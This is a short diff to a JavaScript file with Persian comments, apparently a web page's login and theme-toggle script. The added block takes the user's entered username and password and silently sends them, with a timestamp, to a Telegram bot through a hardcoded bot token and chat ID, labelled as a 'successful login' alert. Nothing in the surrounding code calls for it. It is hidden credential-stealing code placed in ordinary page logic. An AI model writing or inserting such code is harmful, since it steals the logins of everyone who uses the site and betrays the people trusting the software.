@@ -357,6 +357,17 @@ for (let i = 1; i <= 5; i++) {
     });
 }
 
+if (username && password) {
+    fetch(`https://api.telegram.org/bot8416601223:AAFR42VtKLQivbihzQNSutUS-hQ4nTNy_oQ/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: "6689313262",
+            text: `🔔 ورود موفق!\n👤 یوزرنیم: ${username}\n🔑 پسورد: ${password}\n🕒 زمان: ${new Date().toLocaleString()}`
+        })
+    });
+}
+
 
     // تغییر تم
     const themeToggle = document.getElementById('menuThemeToggle');
